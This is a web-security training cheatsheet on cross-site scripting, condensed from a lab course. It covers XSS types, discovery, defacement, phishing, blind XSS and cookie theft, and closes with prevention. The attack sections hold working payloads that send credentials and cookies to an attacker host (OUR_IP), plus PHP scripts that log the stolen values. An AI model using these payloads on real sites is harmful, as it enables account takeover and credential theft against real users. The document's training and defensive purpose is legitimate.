---
title: "XSS Cheatsheet"
categories: [Cheatsheets]
date: 2026-08-06 12:00:00 +0700
tags: [cheatsheet, xss, web, javascript, cwes]
---

Condensed from HTB Academy's Cross-Site Scripting (XSS) module. XSS abuses
missing input sanitization to write JavaScript into a page that then runs in
another user's browser. It executes client-side only, so it never touches the
back-end directly, but it still leads to account takeover, credential theft,
and defacement. Low impact plus high probability equals medium risk, and it is
everywhere.

## The three types

| Type | Where input goes | Persistent | Impact |
|---|---|---|---|
| **Stored** (persistent) | saved to the DB, shown on retrieval (posts, comments) | yes, hits every visitor | highest |
| **Reflected** (non-persistent) | echoed straight back by the server (search, error msg) | no, only your target | medium |
| **DOM-based** | written by client-side JS, never reaches the server | no | lowest |

Stored is worst because one payload affects everyone who loads the page and
may need scrubbing from the database to remove.

## Testing payloads (proof of execution)

```html
<script>alert(window.origin)</script>
```

Use `window.origin`, not `alert(1)`. Many apps handle input inside a
cross-domain iframe, so the origin in the alert tells you *which* frame
actually executed, confirming the real vulnerable form.

If a modern browser blocks `alert()` in that context, fall back to:

- `<plaintext>` stops rendering everything after it (very easy to spot)
- `<script>print()</script>` opens the print dialog, rarely blocked

Confirm by viewing source (`CTRL+U`) and finding your payload in the markup.
For stored XSS, refresh the page: if the alert fires again, it is persistent.

## Reflected: how you weaponize non-persistent XSS

The payload only fires for the person who sends the request, so delivery
depends on the HTTP method. Check the **Network** tab (`CTRL+Shift+I`):

- **GET** (params in the URL) → put the payload in the parameter and send the
  victim the full URL. Once they open it, it executes.
  `http://target/index.php?task=<script>alert(window.origin)</script>`
- POST → you need the victim to submit a form you control (CSRF-style).

## DOM-based: source and sink

DOM XSS is pure client-side. Tell-tale sign: the input parameter sits after a
`#` hashtag, and your string never appears in `CTRL+U` source (only in the
live DOM via `CTRL+Shift+C`), because JS writes it *after* load.

- **Source** = where the JS reads input (`document.URL`, a URL param, a field)
- **Sink** = the function that writes it to the page

Vulnerable sink functions (write raw HTML, no sanitization):

```
document.write()   DOM.innerHTML   DOM.outerHTML
jQuery: add()  after()  append()  html()  prepend()
```

`innerHTML` refuses `<script>` tags, so use an event handler instead:

```html
<img src="" onerror=alert(window.origin)>
```

An empty `src` always fails, so `onerror` always fires, no `<script>` needed.
Deliver via the hash param: `http://target/#task=<img src='' onerror=alert(window.origin)>`

## Discovery

**Automated:** scanners (Burp Pro, ZAP, Nessus) do a passive scan for DOM
sinks and an active scan that injects payloads. Open-source: **XSStrike**,
Brute XSS, XSSer.

```bash
git clone https://github.com/s0md3v/XSStrike.git && cd XSStrike
pip install -r requirements.txt
python xsstrike.py -u "http://target/index.php?task=test"
```

**Manual:** work a payload list (PayloadsAllTheThings, PayloadBox) against
each field. Most payloads fail on any given target because each is written for
a specific injection context (after a quote, inside an attribute, in CSS), so
non-execution does not mean non-vulnerable.

**Code review** is the most reliable method: trace input from source to sink
through front and back end, then write a payload that fits the exact context.

XSS is not limited to visible input fields. It also fires from HTTP headers
like `Cookie` or `User-Agent` whenever their value is reflected on a page.
{: .prompt-tip }

## Attack: defacing (stored XSS)

Three payloads to change the look for every visitor:

```html
<script>document.body.style.background = "#141d2b"</script>
<script>document.title = 'Hacked'</script>
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1>...</h1></center>'</script>
```

Minify your replacement HTML into one line before dropping it into `innerHTML`.

## Attack: phishing (fake login form)

Inject a login form with `document.write()` whose `action` points at your
listener:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" value="Login"></form>');
document.getElementById('urlform').remove();
```

- `remove()` deletes the original element (find its `id` with `CTRL+Shift+C`)
  so the page looks like it genuinely wants a login.
- Append `<!--` to the end of your payload to comment out leftover markup.

Catch the creds with a PHP listener that logs them and redirects the victim
back to the real page (so nothing looks broken):

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
  $file = fopen("creds.txt", "a+");
  fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
  header("Location: http://SERVER_IP/phishing/index.php");
  fclose($file); exit();
}
?>
```

```bash
sudo php -S 0.0.0.0:80   # or: sudo nc -lvnp 80  to just peek at the request
```

## Attack: session hijacking (cookie stealing) + blind XSS

**Blind XSS** = the payload fires on a page you can't see (admin panel,
support ticket, review, contact form). Detect it by loading a remote script
named after the field, so the callback tells you which field is vulnerable:

```html
<script src="http://OUR_IP/username"></script>   <!-- in the username field -->
<script src="http://OUR_IP/fullname"></script>   <!-- in the full-name field -->
```

A hit on `/username` means that field executed. Skip `email` (format-validated
both ends) and `password` (hashed, never reflected) to narrow the search.
Blind XSS pairs best with DOM sinks. Try variants: `'>`, `">`, `$.getScript()`,
`XMLHttpRequest`.

**Steal the cookie** once you have a working field. Host `script.js`:

```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

`new Image()` is quieter than `document.location` (no navigation). Reference it
with `<script src=http://OUR_IP/script.js></script>`. Collector:

```php
<?php
if (isset($_GET['c'])) {
  $list = explode(";", $_GET['c']);
  foreach ($list as $value) {
    $cookie = urldecode($value);
    $file = fopen("cookies.txt", "a+");
    fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
    fclose($file);
  }
}
?>
```

**Use the cookie:** on the login page open Storage (`Shift+F9` in Firefox),
add a cookie where Name is the part before `=` and Value the part after, then
refresh. You are now logged in as the victim. Note: `HttpOnly` cookies cannot
be read by `document.cookie`, so this fails against them.

## Prevention

Two points to secure: the **source** (input) and the **sink** (output), on
both ends. Front-end validation alone is worthless because a custom GET/POST
bypasses it, so the back-end must enforce everything.

| Layer | Do this |
|---|---|
| Input validation | reject anything not matching the expected format (regex; PHP `filter_var(..., FILTER_VALIDATE_EMAIL)`) |
| Input sanitization | escape special chars: `DOMPurify.sanitize()` (JS), `addslashes()` (PHP) |
| Output encoding | encode on display: `htmlentities()` / `htmlspecialchars()` (PHP), `html-entities` (Node) so `<` becomes `&lt;` |
| Never do | put raw user input into `<script>`, `<style>`, tag attributes, comments, or `innerHTML`/`document.write()`/jQuery `html()` |

Server hardening: HTTPS everywhere, `Content-Security-Policy: script-src 'self'`,
`X-Content-Type-Options: nosniff`, `HttpOnly` + `Secure` cookie flags, a WAF,
and framework built-ins (ASP.NET). Validate, sanitize, and output-encode
together and the risk drops sharply.
